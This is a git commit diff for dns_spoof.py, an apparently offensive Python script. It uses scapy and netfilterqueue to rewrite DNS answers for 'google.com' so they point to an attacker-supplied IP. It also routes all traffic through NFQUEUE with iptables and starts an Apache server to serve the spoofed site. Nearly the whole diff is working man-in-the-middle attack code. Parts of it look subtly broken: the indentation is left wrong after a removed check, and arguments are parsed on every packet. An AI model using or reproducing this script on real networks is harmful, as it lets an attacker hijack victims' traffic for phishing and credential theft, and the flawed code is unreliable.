75f02ced4583f3c96131b1ec41accdce1ad6cd75
SAMi-Rn <sami_roudgarian@yahoo.com>
2024-04-02 22:41:00 -0700

    command line options added + the target argument for the apache server + changed the dns to google.com

--- dns_spoof.py
+++ dns_spoof.py
@@ -2,17 +2,28 @@
 import netfilterqueue
 import subprocess
 import scapy.all as scapy
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
+    options = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify a target IP address, use --help for more info.")
+    return options
 
 
 def process_packet(packet):
+    options = get_arguments()
+    target_ip = options.target
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):  # Check if the packet is a DNS response
         # Now also check if it's a DNS query
-        if scapy_packet.haslayer(scapy.DNSQR):  
-            qname = scapy_packet[scapy.DNS].qd.qname
-            if "static.cdninstagram.com." in str(qname):
+            qname = scapy_packet[scapy.DNSQR].qname
+            if "google.com" in str(qname):
                 print("[+] Spoofing target")
-                answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.100")
+                answer = scapy.DNSRR(rrname=qname, rdata=target_ip)
                 scapy_packet[scapy.DNS].an = answer
                 # set the number of answers to 1
                 scapy_packet[scapy.DNS].ancount = 1
@@ -26,6 +37,10 @@ def process_packet(packet):
 
 
 try:
+    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["service", "apache2", "start"])
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
@@ -33,6 +48,6 @@ except KeyboardInterrupt:
     print("\n[+] Detected CTRL + C ...")
     print("[+] Flushing IP tables")
     subprocess.call("iptables --flush", shell=True)
-    print("[+] Stopping DNS Spoof")
-
-
+    print("[+] IP tables flushed")
+    subprocess.call("service apache2 stop", shell=True)
+    print("[+] Stopping Apache server")
